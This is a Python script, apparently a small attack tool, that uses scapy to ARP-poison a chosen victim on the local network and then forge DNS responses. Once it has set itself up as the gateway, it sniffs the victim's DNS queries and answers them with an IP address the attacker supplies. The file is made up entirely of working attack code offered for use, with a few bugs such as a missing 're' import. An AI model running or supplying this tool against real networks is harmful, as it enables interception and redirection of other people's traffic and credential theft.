from scapy.all import *
from subprocess import *
from threading import Thread
import socket
import netifaces as ni

mac_spoofed = "" # mac address sent to the victim's arp table
ip_attacker = "" 
mac_attacker = ""
ip_victim = ""
mac_victim = ""
lan_gateway_ip = ""
ip_spoofed = ""
choice = ""

def get_mac(ip):
	Popen(["ping", "-c 1", ip], stdout = PIPE)
	pid = Popen(["arp", "-n", ip], stdout = PIPE)
	s = pid.communicate()[0]
	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
	return mac

def set_parameters():
	global mac_spoofed, ip_attacker, mac_attacker, ip_victim, mac_victim, lan_gateway_ip

	default_interface = ni.interfaces()[1]
	ip_attacker = ni.ifaddresses(default_interface)[ni.AF_INET][0]['addr']
	
	with open('/sys/class/net/' + default_interface + '/address') as f:
	   global macA
	   mac_attacker = f.read()

	ip_victim = raw_input('Input IP address of a victim within your local network: ')

	mac_victim = get_mac(ip_victim)

	if choice is "1":	# ask for a spoofed mac address only for arp poisoning
		mac_spoofed = raw_input('Input MAC address of a new gateway for the victim, or leave blank to use MAC of your computer: ')

	if (mac_spoofed is ""):
		mac_spoofed = mac_attacker	

	lan_gateway_ip = ni.gateways()['default'][ni.AF_INET][0]

	call(["clear"])

	print("Attacker IP: " + ip_attacker + ", Attacker MAC: " + mac_attacker)
	print("Victim IP: " + ip_victim + ", Victim MAC: " + mac_victim)
	print ("Local gateway: " + lan_gateway_ip)


def arp_poisoning():
	pkt = Ether() / ARP()

	pkt[Ether].src = mac_spoofed
	pkt[ARP].hwsrc = mac_spoofed
	pkt[ARP].psrc = lan_gateway_ip
	pkt[ARP].hwdst = mac_victim
	pkt[ARP].pdst = ip_victim
	pkt[ARP].op = 'is-at'

	print("Spoofing, gateway for the victim is now: " + mac_spoofed)

	while True:
		sendp(pkt, verbose=False)

def dns_spoofing():
	global ip_spoofed
	ip_spoofed = raw_input("Enter an IP address with which you would like to poison the DNS cache: ")

	thread = Thread(target = arp_poisoning, args = ())
	thread.start()

	sniff(filter = "udp port 53", prn = send_spoofed_rsp, store = 0)
	
def send_spoofed_rsp(pkt):
	if pkt.haslayer(DNSQR) and pkt[IP].src == ip_victim:
		spoof_pkt = IP(dst = pkt[IP].src, src = pkt[IP].dst)/\
                          UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/\
                          DNS(id = pkt[DNS].id, qr = 1, aa = 1, qd = pkt[DNS].qd,\
                          an = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 10, rdata = ip_spoofed))
		send(spoof_pkt, verbose=False)

def main():
	global choice
	choice = raw_input('Input 1 for ARP poisoning, or 2 for DNS spoofing: ')

	if choice is '1':
		set_parameters()
		arp_poisoning()
	elif choice is '2':
		set_parameters()
		dns_spoofing()
	else:
		print "You can select only 1 or 2, try again"
		main()

main()